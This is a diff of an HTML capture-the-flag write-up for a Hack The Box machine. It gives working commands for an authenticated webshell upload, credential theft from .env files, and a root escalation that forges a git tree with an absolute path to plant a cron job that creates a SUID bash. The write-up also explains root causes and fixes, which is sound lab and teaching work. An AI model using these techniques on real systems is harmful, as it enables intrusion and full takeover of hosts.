+for mode, objhash, filepath in entries:          </span><span class="pco"># filepath = git tree-entry name</span><span class="po">
+    target = </span><span class="py">os.path.join(stage_path, filepath)</span><span class="po">
+    ...
+    with open(target, 'wb') as f:                </span><span class="pco"># written as ROOT</span><span class="po">
+        f.write(cat_result.stdout)</span></div>
+  </div>
+
+  <p><code>filepath</code> is attacker-controlled — it's whatever name a tree entry carries — and it flows straight into <code>os.path.join</code>. The quirk that makes this fatal:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">os.path.join and a leading slash</span>
+    </div>
+    <div class="term-body"><span class="pd">&gt;&gt;&gt; </span><span class="pc">os.path.join('/home/git/staging/jones/pwn', 'a/b.txt')</span>
+<span class="po">'/home/git/staging/jones/pwn/a/b.txt'</span>
+<span class="pd">&gt;&gt;&gt; </span><span class="pc">os.path.join('/home/git/staging/jones/pwn', '/etc/cron.d/pwncron')</span>
+<span class="pg">'/etc/cron.d/pwncron'      </span><span class="pco"># absolute component discards the prefix</span></div>
+  </div>
+
+  <p>So if I can get a tree entry whose name is <code>/etc/cron.d/pwncron</code>, the root process writes my file straight into <code>/etc/cron.d</code>. The blocker is that Git's plumbing (and Gitea's push checks) reject <code>../</code> and leading-slash pathnames the normal way. The way through is to <strong>forge the git objects by hand</strong> — build a raw tree object whose entry name is the absolute path, using <code>hash-object --literally</code>, which skips the sanity checks:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">forge the malicious tree + commit</span>
+    </div>
+    <div class="term-body"><span class="pco"># payload the root cron will run: SUID-copy bash</span>
+<span class="pd">$ </span><span class="pc">printf '* * * * * root /tmp/.copybash.sh\n' &gt; cronfile</span>
+<span class="pd">$ </span><span class="pc">BLOB=$(git hash-object -w --stdin &lt; cronfile)</span>
+
+<span class="pco"># a tree entry: mode 100644, NAME = an absolute path, pointing at that blob</span>
+<span class="pd">$ </span><span class="pc">PH=$(echo -n "$BLOB" | xxd -r -p)                       </span><span class="pco"># 20 raw bytes of the hash</span>
+<span class="pd">$ </span><span class="pc">TREE=$(printf '100644 /etc/cron.d/pwncron\0%s' "$PH" \
+     | git hash-object -w -t tree --literally --stdin)</span>
+<span class="pd">$ </span><span class="pc">COMMIT=$(git commit-tree "$TREE" -m pwn)</span>
+<span class="pd">$ </span><span class="pc">git update-ref refs/heads/main "$COMMIT"; git ls-tree -r HEAD</span>
+<span class="pg">100644 blob …  /etc/cron.d/pwncron</span></div>
+  </div>
+
+  <p>Now create a repo as <code>jones</code>, mark it a <strong>template</strong> (that's the flag the sync script filters on), and push the forged history. The <code>/tmp/.copybash.sh</code> the cron references just copies bash and sets the SUID bit:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">stage payload, create template repo, push</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">printf '#!/bin/bash\ncp /bin/bash /tmp/.rootbash\nchmod 4755 /tmp/.rootbash\n' \
+     &gt; /tmp/.copybash.sh; chmod a+rx /tmp/.copybash.sh</span>
+<span class="pd">$ </span><span class="pc">curl -su jones:$PW -X POST  localhost:3000/api/v1/user/repos   -d '{"name":"pwn"}'</span>
+<span class="pd">$ </span><span class="pc">curl -su jones:$PW -X PATCH localhost:3000/api/v1/repos/jones/pwn -d '{"template":true}'</span>
+<span class="pd">$ </span><span class="pc">git push -f http://jones:$PW@localhost:3000/jones/pwn.git main</span></div>
+  </div>
+
+  <p>Within a minute the root timer syncs the "template", <code>os.path.join</code> resolves the entry name to <code>/etc/cron.d/pwncron</code>, and root writes it. Cron runs the SUID copy, and <code>bash -p</code> keeps the root EUID:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">root.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">tail -2 /var/log/template-sync.log</span>
+<span class="po">[…] synced: /etc/cron.d/pwncron
+[…] Template sync complete</span>
+<span class="pd">$ </span><span class="pc">ls -l /tmp/.rootbash</span>
+<span class="po">-rwsr-xr-x 1 root root 1446024 /tmp/.rootbash</span>
+<span class="pd">$ </span><span class="pc">/tmp/.rootbash -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=1000(jones) gid=1000(jones) euid=0(root)</span>
+<span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">The bug isn't <code>os.path.join</code> — it's trusting a filename from an untrusted source as a write target. A git tree entry name is attacker data; feeding it to a path join that a leading slash can hijack turns "sync some template files" into arbitrary root file-write. Two independent guards would each have stopped it: joining with the basename only (or rejecting absolute/<code>..</code> components after the join), and running the sync as an unprivileged service account instead of root.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
 
   <table class="st">
-    <tr><th>Stage</th><th>Technique</th><th>Tool</th></tr>
-    <tr><td>Recon</td><td>Vhost discovery — Gitea + Krayin CRM behind the main site</td><td>ffuf</td></tr>
-    <tr><td>Credential leak</td><td>DB password left in an old, unreverted Gitea commit</td><td>git log -p</td></tr>
-    <tr><td>Foothold</td><td>Authenticated TinyMCE upload RCE — extension-only validation</td><td>Burp Suite, curl</td></tr>
-    <tr><td>Credential theft</td><td>Plaintext DB password in Krayin's <code>.env</code></td><td>—</td></tr>
-    <tr><td>Lateral move</td><td>Password reuse (Krayin DB → jones SSH)</td><td>ssh</td></tr>
-    <tr><td>Root</td><td>Gitea template-sync <code>git ls-tree</code> path traversal, root timer</td><td>Custom bash exploit</td></tr>
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>→ git .env</td><td>Secret committed to version control; scrubbing HEAD leaves it in history (CWE-538 / CWE-312)</td></tr>
+    <tr><td>→ Krayin admin</td><td>Password reuse across the DB config and the CRM admin account (CWE-521 / CWE-798)</td></tr>
+    <tr><td>→ www-data</td><td>CVE-2026-38526 — unrestricted file upload, no type/extension check, into a web-served dir (CWE-434)</td></tr>
+    <tr><td>→ jones</td><td>Another reused password sitting in the deployed app's <code>.env</code> (CWE-522)</td></tr>
+    <tr><td>→ root</td><td>Root sync writes to an untrusted git tree-entry path; an absolute path escapes the staging dir (CWE-22 / CWE-250)</td></tr>
   </table>
 
-  <!-- ══ COMMAND REF ══ -->
+  <h2>Operator notes — from macOS</h2>
+
+  <ul>
+    <li><strong>No reverse shells.</strong> A scriptable webshell (<code>?c=</code>) covered the <code>www-data</code> step, and an SSH key covered <code>jones</code> — both stable and non-interactive, so nothing to babysit across a VPN.</li>
+    <li><strong>Host headers beat <code>/etc/hosts</code> churn.</strong> Every web request used <code>curl -H "Host: …"</code>, so no sudo was needed to test the three vhosts.</li>
+    <li><strong>The root exploit is git plumbing, not tooling.</strong> Nothing macOS-specific — <code>git hash-object -t tree --literally</code> and <code>commit-tree</code> forge the object graph identically everywhere; the trick is understanding that a tree entry's name is just a string in a blob you can author yourself.</li>
+    <li><strong>Old secrets live in old commits.</strong> Always fetch sensitive files at the <em>first</em> commit, not just HEAD — a cleaned-up <code>.env</code> at the tip is the classic misdirection.</li>
+  </ul>
+
   <h2>Key commands</h2>
 
   <div class="terminal">
@@ -729,27 +661,27 @@ ssh -i /tmp/.exploit_key -o StrictHostKeyChecking=no root@$TARGET</span></div>
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
       <span class="term-label">quick reference</span>
     </div>
-    <div class="term-body"><span class="pco"># Enumeration</span>
-<span class="pc">ffuf -w subdomains.txt -H "Host: FUZZ.nexus.htb" -u http://&lt;IP&gt; -fs &lt;size&gt;</span>
-<span class="pc">git log -p --all -- .env docker-compose.yml</span>
+    <div class="term-body"><span class="pco"># 1. vhosts → git + billing</span>
+<span class="pc">ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -w dns-Jhaddix.txt -fs 154</span>
 
-<span class="pco"># TinyMCE upload RCE (Krayin CRM)</span>
-<span class="pc">curl "http://billing.nexus.htb/storage/tinymce/&lt;hash&gt;.php?cmd=id"</span>
+<span class="pco"># 2. password from the FIRST commit's .env (not HEAD)</span>
+<span class="pc">curl -s -H "Host: git.nexus.htb" "http://&lt;IP&gt;/admin/krayin-docker-setup/raw/commit/&lt;first-sha&gt;/.env"</span>
 
-<span class="pco"># Post-exploit</span>
-<span class="pc">cat /var/www/html/krayin/.env | grep -i pass</span>
+<span class="pco"># 3. Krayin CVE-2026-38526: authed TinyMCE upload → webshell</span>
+<span class="pc">curl -b cj -H "Host: billing.nexus.htb" -H "X-CSRF-TOKEN: $T" -F "_token=$T" -F "file=@sh.php;type=image/png" http://&lt;IP&gt;/admin/tinymce/upload</span>
 
-<span class="pco"># Gitea template-sync path traversal → root</span>
-<span class="pc">systemctl list-timers | grep gitea</span>
-<span class="pc">curl -s -X POST $GITEA/api/v1/users/$USER/tokens -u "$USER:$PASS" \</span>
-<span class="pc">  -d '{"name":"t","scopes":["write:repository"]}'</span>
-<span class="pc">curl -s -X PATCH $GITEA/api/v1/repos/$USER/rce -H "Authorization: token $TOKEN" \</span>
-<span class="pc">  -d '{"template":true}'</span>
-<span class="pc">mkdir -p "../../../../../root/.ssh" &amp;&amp; git add . &amp;&amp; git commit -m x &amp;&amp; git push</span></div>
+<span class="pco"># 4. on-disk .env → SSH as jones (user.txt)</span>
+<span class="pc">curl -H "Host: billing.nexus.htb" "http://&lt;IP&gt;/storage/tinymce/&lt;hash&gt;.php?c=grep+PASS+/var/www/krayin/.env"</span>
+
+<span class="pco"># 5. root: forge an absolute-path git tree → root cron via template-sync</span>
+<span class="pc">BLOB=$(git hash-object -w --stdin &lt; cronfile)</span>
+<span class="pc">TREE=$(printf '100644 /etc/cron.d/pwncron\0%s' "$(echo -n $BLOB|xxd -r -p)" | git hash-object -w -t tree --literally --stdin)</span>
+<span class="pc">git commit-tree $TREE -m x | xargs -I{} git update-ref refs/heads/main {}</span>
+<span class="pc">curl -su jones:$PW -X PATCH localhost:3000/api/v1/repos/jones/pwn -d '{"template":true}'; git push -f http://jones:$PW@localhost:3000/jones/pwn.git main</span>
+<span class="pc">/tmp/.rootbash -p -c 'cat /root/root.txt'</span></div>
   </div>
 
 </div>
-
 <div class="htb-cta">
   <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
     <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
